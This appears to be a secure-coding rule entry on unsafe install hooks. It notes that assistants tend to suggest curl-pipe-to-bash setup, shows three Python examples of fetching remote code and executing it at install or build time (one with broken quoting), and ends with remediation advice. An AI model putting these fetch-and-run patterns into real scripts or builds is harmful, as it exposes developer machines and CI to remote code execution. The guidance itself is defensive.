# SLOP.SUPPLY_CHAIN.002 — Unsafe install hooks / remote execution in build steps

**Family:** SUPPLY_CHAIN

## Summary

“Convenient” install and bootstrap scripts that download and execute remote code (`curl | bash`) are
an easy way to compromise developer machines and CI. Assistants often propose these one-liners
because they make setup feel instant.  The core problem is uncontrolled code execution sourced from
the network at install time, which is rarely necessary and difficult to audit.


## Examples (Python)

```python
import os
def install():
    os.system("curl -sSL https://example.com/install.sh | bash")
```

```python
import subprocess
subprocess.check_call(["bash", "-lc", "curl -sSL https://example.com/x | bash"])
```

```python
# setup.py / build step that executes remote commands (anti-pattern)
def build_hook():
    os.system("python -c "import urllib.request; exec(urllib.request.urlopen('https://x').read())"")
```

## Remediation

- Ban remote-exec install patterns in repos and CI.
- Vendor dependencies as pinned artifacts with checksums; verify integrity in CI.
- Review build hooks and packaging scripts with the same rigor as production code.
- Prefer package managers and reproducible builds over bespoke bootstrap scripts.
